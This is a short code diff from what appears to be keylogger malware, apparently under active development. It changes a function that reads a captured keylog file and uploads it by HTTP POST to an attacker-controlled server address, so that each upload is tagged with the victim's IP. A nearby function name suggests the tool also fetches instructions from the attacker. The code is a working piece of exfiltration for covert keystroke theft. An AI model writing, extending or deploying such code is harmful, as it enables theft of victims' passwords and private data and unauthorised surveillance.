@@ -30,11 +30,11 @@ def get_instruction(victim_ip):
     return command
 
 # Sends keylog.txt to the attacker machine and resets it
-def send_keylog_to_attacker():
+def send_keylog_to_attacker(victim_ip):
     try:
         with open(KEYLOG_TXT_FILE, 'rb') as file:
             files = {'file': (file.name, file)}
-            response = requests.post(f'{ATTACKER_SERVER_IP}/upload_file', files=files)
+            response = requests.post(f'{ATTACKER_SERVER_IP}/upload_file/{victim_ip}', files=files)
             # print(f'Status code: {response.status_code}')
 
         reset_keylog_file()
